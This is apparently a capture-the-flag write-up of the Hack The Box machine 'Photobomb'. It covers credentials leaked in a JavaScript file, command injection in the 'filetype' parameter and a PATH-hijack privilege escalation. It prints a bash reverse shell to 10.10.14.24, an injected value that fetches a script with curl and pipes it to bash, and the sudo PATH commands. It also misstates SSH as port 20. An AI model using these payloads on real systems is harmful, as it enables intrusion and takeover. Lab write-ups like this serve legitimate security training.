+++
title = "HTB Photobomb"
date = "2023-04"
author = "Celeste"
authorTwitter = "" #do not include @
cover = ""
tags = ["HTB", "Writeup"]
keywords = ["", ""]
description = ""
showFullContent = false
readingTime = false
hideComments = false
color = "" #color from the theme settings
+++

#### Overview
This is an easy linux box with fairly straight forward command injection leading to initial access and path manipulation to use a binary we can run as root to escalate privileges. 

#### Enumeration 

```
$ nmap -p- 10.10.11.182 --open --min-rate 5000 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 22:15 AEST
Nmap scan report for 10.10.11.182
Host is up (0.30s latency).
Not shown: 54219 closed tcp ports (conn-refused), 11314 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

So we have
- Port 80  HTTP
- Port 20 SSH

Navigating to the Webpage. The address doesn't resolve to i add `10.10.11.182 photobomb.htb` to the end of my /etc/hosts file. 

I can then view the page in my browser. in summary we are told to "click here" to get started and the credentials are in our welcome pack. 

When you click of the "click here" link you are redirected to /printer and prompted to login. I tried a couple of default creds with no luck and went to see what else i could find. 

Viewing the source of the home page you can see photobomb.js it linked. 

![source](hsource.png)

Veiwing photobomb.js gives you creds nice and easy. 
```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

We can now log in to photobomb.htb/printer with these credentials. 
```
user: pH0t0
password: b0Mb!
```

#### Initial Access

![login](login.png)

The next page allows us to download images in various formats. 
Capturing the request sent to the server when we click the download link we see three paramaters we could potentially inject commands into. 
```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=30x20
```
I did try all three and only found success injecting into the filetype paramater. 

To get a shell i injected a command to curl a bash script from a python server I had started with `python3 -m http.server` containing a basic bash reverse shell `bash -i >& /dev/tcp/10.10.14.24/1299 0>&1` and piped it into bash. Before sending this request i had started a netcat listener on port 1299. 

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl+10.10.14.24:8000/shell.sh|bash&dimensions=30x20
```

Once on the box, i got the user.txt in wizards home directory and started looking for a vector for privilege escalation. 

#### Privilege Escalation

```sh
wizard@photobomb:~/photobomb$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Our user can run cleanup.sh as root, so if we can get cleanup.sh to change permissions of bash or spawn a shell for us we can have a shell as root. 


I check the permissions of cleanup.sh and read the contents. 
```
wizard@photobomb:~/photobomb$ ls -l /opt/cleanup.sh
ls -l /opt/cleanup.sh
-r-xr-xr-x 1 root root 340 Sep 15  2022 /opt/cleanup.sh
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```

What's interesting here is that all of the binaries called in this script are called by their full path except the `find` at the end. This means the computer will search for this binary in the PATH environment variable and hope for the best. If we can manipulate the bash variable however we can get the script to run anything we would like so long as it's named `find`. 

So i wrote a simple bash script to spawn a bash shell and names it find in /tmp

```bash
#!/bin/bash

/bin/bash
```

I then made my `find` executable and ran cleanup.sh with PATH set to /tmp:$PATH so that the first `find` executable cleanup.sh would find would be my bash script. 
```
wizard@photobomb:/tmp$ chmod +x find
chmod +x find
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# 
```
And we have a root shell. Then all that's left is to cat /root/root.txt to get the root flag and you're done. 